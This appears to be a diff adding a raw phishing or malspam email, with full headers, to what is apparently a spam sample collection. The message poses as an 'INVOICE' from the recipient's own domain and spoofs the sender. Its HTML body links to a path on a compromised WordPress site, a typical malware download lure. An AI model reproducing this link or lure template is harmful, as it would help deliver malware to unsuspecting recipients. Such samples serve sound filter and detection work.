@@ -1,0 +1,53 @@
+ARC-Authentication-Results: i=1; mgonzalez@s3ao98f6lw.co.uk;
+       spf=softfail (mgonzalez@s3ao98f6lw.co.uk: domain of transitioning servicepwrbr@b7f8xfocwi.co.uk does not designate 103.24.96.3 as permitted sender) smtp.mailfrom=Servicepwrbr@b7f8xfocwi.co.uk
+Return-Path: <Servicepwrbr@b7f8xfocwi.co.uk>
+Received: from 21iwn8lw8e.edu (21iwn8lw8e.edu. [103.24.96.3])
+        by mgonzalez@s3ao98f6lw.co.uk with ESMTP id p15si15400821wrj.426.2020.07.20.13.50.47
+        for mgonzalez@s3ao98f6lw.co.uk;
+        Mon, 20 Jul 2020 13:50:47 -0700 (PDT)
+Received-SPF: softfail (mgonzalez@s3ao98f6lw.co.uk: domain of transitioning servicepwrbr@b7f8xfocwi.co.uk does not designate 103.24.96.3 as permitted sender) client-ip=103.24.96.3;
+Authentication-Results: mgonzalez@s3ao98f6lw.co.uk;
+       spf=softfail (mgonzalez@s3ao98f6lw.co.uk: domain of transitioning servicepwrbr@b7f8xfocwi.co.uk does not designate 103.24.96.3 as permitted sender) smtp.mailfrom=Servicepwrbr@b7f8xfocwi.co.uk
+Received: from localhost (localhost [127.0.0.1])
+	by 21iwn8lw8e.edu (Postfix) with ESMTP id 8DD0F2C1762
+	for mgonzalez@s3ao98f6lw.co.uk; Tue, 21 Jul 2020 01:50:46 +0500 (PKT)
+X-Virus-Scanned: amavisd-new at 21iwn8lw8e.edu
+Received: from 21iwn8lw8e.edu ([127.0.0.1])
+	by localhost (21iwn8lw8e.edu [127.0.0.1]) (amavisd-new, port 10024)
+	with ESMTP id djNZ6Alo6zPN for mgonzalez@s3ao98f6lw.co.uk;
+	Tue, 21 Jul 2020 01:50:44 +0500 (PKT)
+Received: from mail.b7f8xfocwi.co.uk (static-234-5-129-150.ebonenet.com [150.129.5.234])
+	by 21iwn8lw8e.edu (Postfix) with ESMTP id E12772C1765
+	for mgonzalez@s3ao98f6lw.co.uk; Tue, 21 Jul 2020 01:50:44 +0500 (PKT)
+Received: from [190.50.117.177] by mail.b7f8xfocwi.co.uk (MDaemon PRO v11.0.3)
+	with ESMTP id md50000487257.msg
+	for mgonzalez@s3ao98f6lw.co.uk; Tue, 21 Jul 2020 01:56:42 +0500
+X-Spam-Processed: mail.b7f8xfocwi.co.uk, Tue, 21 Jul 2020 01:56:42 +0500
+	(not processed: message from trusted or authenticated source)
+X-Authenticated-Sender: Servicepwrbr@b7f8xfocwi.co.uk
+X-MDRemoteIP: 190.50.117.177
+X-Return-Path: Servicepwrbr@b7f8xfocwi.co.uk
+X-Envelope-From: Servicepwrbr@b7f8xfocwi.co.uk
+X-MDaemon-Deliver-To: mgonzalez@s3ao98f6lw.co.uk
+Date: Mon, 20 Jul 2020 17:50:34 -0300
+From: "mgonzalez@s3ao98f6lw.co.uk <mgonzalez@s3ao98f6lw.co.uk@mgonzalez@s3ao98f6lw.co.uk>" <Servicepwrbr@b7f8xfocwi.co.uk>
+To: mgonzalez@s3ao98f6lw.co.uk
+Subject: INVOICE 120315 from [recipient's email domain]
+MIME-Version: 1.0
+Content-Type: text/html; charset=UTF-8
+Content-Transfer-Encoding: quoted-printable
+Message-Id: <20200720205046.8DD0F2C1762@21iwn8lw8e.edu>
+
+<html>
+<body>
+Please see attachment for your scanned document.=0D
+<br>
+<br>
+<a href=3D"http://wmzart.com/wp-includes/pJ/">http://wmzart.com/wp-includes=
+/pJ/</a>
+<br>
+<br>
+<i>[recipient's email domain]</i>
+</body>
+</html>
+
